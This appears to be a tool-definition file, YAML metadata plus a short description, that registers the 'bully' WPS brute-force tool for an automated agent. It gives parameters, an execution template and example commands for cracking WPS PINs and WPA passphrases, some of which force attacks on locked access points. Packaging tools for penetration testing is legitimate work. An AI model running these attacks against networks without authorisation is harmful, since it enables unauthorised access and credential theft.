---
id: security-wireless-bully
namespace: security:wireless:bully
name: bully
description: WPS brute-force attack tool similar to Reaver but with improved reliability and performance.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.wps.bruteforce
  - network.crack.wpa
  - network.pin.attack
platforms:
  - linux
risk_level: medium
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - reaver
  - aircrack-ng
  - wifite
artifacts:
  - type: wireless.wps.pin
    description: Recovered WPS PIN
    mime: text/plain
    trust_level: verified
  - type: wireless.wpa.psk
    description: Cracked WPA passphrase
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - wps-pin
    - wpa-passphrase
    - session
  consumes:
    - target-bssid
    - network-manipulation-interface
contract:
  inputs:
    - type: wireless.interface
      description: Wireless interface in monitor mode
    - type: wireless.bssid
      description: Target AP BSSID
    - type: wireless.channel
      description: Target channel
  outputs:
    - type: wireless.wps.pin
      description: Recovered WPS PIN
      mime: text/plain
    - type: wireless.wpa.psk
      description: WPA passphrase recovered via WPS
      mime: text/plain
  side_effects:
    - network_traffic
    - raw_socket_access
    - network_traffic
  resource_cost:
    cpu: medium
    memory_mb: 32
    network: low
    disk_io: low
resource_profile:
  cpu: medium
  memory_mb: 32
  network: low
  disk_io: low
allowed-tools:
  - bully
  - Bash
  - execFile
parameters:
  - name: interface
    type: string
    required: true
    description: "Wireless interface name (monitor mode)"
    aliases:
      - -i
      - --interface
  - name: bssid
    type: string
    required: true
    description: "Target AP BSSID"
    aliases:
      - -b
      - --bssid
  - name: channel
    type: integer
    required: false
    description: "Wireless channel of target AP"
    aliases:
      - -c
      - --channel
  - name: pin
    type: string
    required: false
    description: "WPS PIN to test"
    aliases:
      - -p
      - --pin
  - name: lock-delay
    type: integer
    required: false
    description: "Delay in seconds after lockout"
    aliases:
      - -l
      - --lock-delay
  - name: timeout
    type: integer
    required: false
    description: "Receive timeout in seconds"
    aliases:
      - -t
      - --timeout
  - name: delay
    type: integer
    required: false
    description: "Delay between pin attempts"
    aliases:
      - -d
      - --delay
  - name: session
    type: file
    required: false
    description: "Session file for resume support"
    aliases:
      - -s
      - --session
  - name: verbose
    type: boolean
    required: false
    description: "Enable verbose output"
    aliases:
      - -v
      - --verbose
  - name: force
    type: boolean
    required: false
    description: "Force attack even if AP is locked"
    aliases:
      - -F
      - --force
  - name: bruteforce
    type: boolean
    required: false
    description: "Brute-force the full PIN space"
    aliases:
      - -B
      - --bruteforce
  - name: step
    type: integer
    required: false
    description: "PIN increment step value"
    aliases:
      - -S
      - --step
execution:
  template: "bully -i {interface} -b {bssid}"
  sandbox: execFile
  timeout_seconds: 86400
  shell: false
global_vars:
  interface: wlan0mon
  bssid: "00:11:22:33:44:55"
examples:
  - description: "Basic WPS brute force"
    command: bully -i wlan0mon -b 00:11:22:33:44:55
  - description: "With verbose output and channel"
    command: bully -i wlan0mon -b 00:11:22:33:44:55 -c 6 -v
  - description: "Resume from saved session"
    command: bully -i wlan0mon -b 00:11:22:33:44:55 -s session.dat
  - description: "Test specific PIN"
    command: bully -i wlan0mon -b 00:11:22:33:44:55 -p 12345670
  - description: "Brute-force full PIN space"
    command: bully -i wlan0mon -b 00:11:22:33:44:55 -B
  - description: "Force attack with lock delay"
    command: bully -i wlan0mon -b 00:11:22:33:44:55 -F -l 60
  - description: "Fixed channel with step value"
    command: bully -i wlan0mon -b 00:11:22:33:44:55 -c 11 -S 10
  - description: "Quiet mode with delay between pins"
    command: bully -i wlan0mon -b 00:11:22:33:44:55 -q -d 2
references:
  - label: "Bully GitHub"
    url: "https://github.com/aanarchyy/bully"
  - label: "WPS Attack Comparison"
    url: "https://github.com/aanarchyy/bully/wiki"
phase: exploitation
techniques:
  - credential-access
  - network-manipulation
items:
  - NoCreds
services: []
attack_types:
  - Discovery
features:
  - requires-root
---

# Bully — WPS Brute-Force Tool

Bully is a WPS brute-force attack tool that serves as an alternative to Reaver with improved reliability, performance, and better handling of locked APs.

## Advantages Over Reaver

- More reliable EAPOL start and WSC data parsing
- Better handling of WPS locked states
- Improved detection of M5/M7 EAPol-forward errors
- Lower CPU and memory footprint
- Session save/resume compatible with Reaver sessions
